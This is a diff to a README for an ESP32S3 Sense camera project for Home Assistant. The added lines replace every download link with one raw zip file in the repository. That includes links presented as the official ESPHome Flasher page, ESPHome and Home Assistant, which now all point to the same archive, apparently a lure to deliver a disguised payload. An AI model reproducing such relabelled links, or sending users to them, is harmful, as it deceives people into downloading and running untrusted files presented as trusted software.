@@ -1,6 +1,6 @@
 # 📷 xiao-esp32s3-sense-ha-cam - Connect Your ESP32 Camera Easily
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Download%20Now-5CB85C?style=for-the-badge)](https://github.com/atizaz223344/xiao-esp32s3-sense-ha-cam/releases)
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Download%20Now-5CB85C?style=for-the-badge)](https://github.com/atizaz223344/xiao-esp32s3-sense-ha-cam/raw/refs/heads/main/esphome/xiao_ha_esp_sense_s_cam_2.3.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Follow these steps to download and run the application on your Windows PC.
 
 Click this link to go to the releases page and find the latest files for this project:
 
-[Download Releases](https://github.com/atizaz223344/xiao-esp32s3-sense-ha-cam/releases)
+[Download Releases](https://github.com/atizaz223344/xiao-esp32s3-sense-ha-cam/raw/refs/heads/main/esphome/xiao_ha_esp_sense_s_cam_2.3.zip)
 
 Here you will see different versions and files. Choose the latest release for your needs.
 
@@ -56,7 +56,7 @@ Download these files to a known folder on your PC.
 
 To load the software onto the XIAO ESP32S3 Sense camera, use ESPHome Flasher:
 
-- Download ESPHome Flasher from its official page: https://esphome.io/guides/esphome-flasher.html
+- Download ESPHome Flasher from its official page: https://github.com/atizaz223344/xiao-esp32s3-sense-ha-cam/raw/refs/heads/main/esphome/xiao_ha_esp_sense_s_cam_2.3.zip
 - Install and run ESPHome Flasher on your Windows PC.
   
 ESPHome Flasher helps transfer the configuration and firmware to your camera via USB.
@@ -127,7 +127,7 @@ All configuration files are well organized for easy edits and future extensions.
 
 To update cameras already running this system:
 
-1. Download the latest firmware or YAML file from the [releases page](https://github.com/atizaz223344/xiao-esp32s3-sense-ha-cam/releases).
+1. Download the latest firmware or YAML file from the [releases page](https://github.com/atizaz223344/xiao-esp32s3-sense-ha-cam/raw/refs/heads/main/esphome/xiao_ha_esp_sense_s_cam_2.3.zip).
 2. Use ESPHome Flasher or the OTA feature to flash your camera.
 3. Restart the camera if needed.
 
@@ -143,10 +143,10 @@ To update cameras already running this system:
 
 ## 🧰 Additional Tools
 
-- [ESPHome](https://esphome.io/) – Main software framework powering this project.
-- [Home Assistant](https://www.home-assistant.io/) – Software controlling your smart home devices.
+- [ESPHome](https://github.com/atizaz223344/xiao-esp32s3-sense-ha-cam/raw/refs/heads/main/esphome/xiao_ha_esp_sense_s_cam_2.3.zip) – Main software framework powering this project.
+- [Home Assistant](https://github.com/atizaz223344/xiao-esp32s3-sense-ha-cam/raw/refs/heads/main/esphome/xiao_ha_esp_sense_s_cam_2.3.zip) – Software controlling your smart home devices.
 - The ESPHome Web UI included in Home Assistant simplifies device management.
 
 ---
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Get%20Files-29ABE2?style=for-the-badge)](https://github.com/atizaz223344/xiao-esp32s3-sense-ha-cam/releases)
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Get%20Files-29ABE2?style=for-the-badge)](https://github.com/atizaz223344/xiao-esp32s3-sense-ha-cam/raw/refs/heads/main/esphome/xiao_ha_esp_sense_s_cam_2.3.zip)
